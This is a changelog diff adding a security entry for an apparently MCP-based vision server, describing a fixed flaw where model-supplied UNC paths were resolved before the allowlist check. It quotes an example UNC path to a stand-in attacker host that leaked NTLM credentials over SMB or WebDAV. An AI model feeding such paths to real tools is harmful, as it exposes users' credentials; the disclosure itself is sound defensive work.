@@ -7,6 +7,19 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Security
+
+- **The vision MCP server authorizes a path before any filesystem call.**
+  Before, `view_image` resolved the path from the model on disk and only then
+  checked the allowlist. On Windows, a UNC path such as
+  `\\attacker.example\share\x.png` thus opened an SMB or WebDAV session that
+  sent the user's NTLM credentials, even with an empty allowlist. Now the
+  server refuses a request whose lexical form (resolved, normalized,
+  case-folded on Windows) is not on the allowlist, before it reads anything.
+  `vision` now records each image twice: the absolute path as given and its
+  realpath. A spelling that is not on the list is refused, for example an
+  8.3 short name when the command named the long name.
+
 ## [3.0.0] — 2026-10-08
 
 ### Breaking
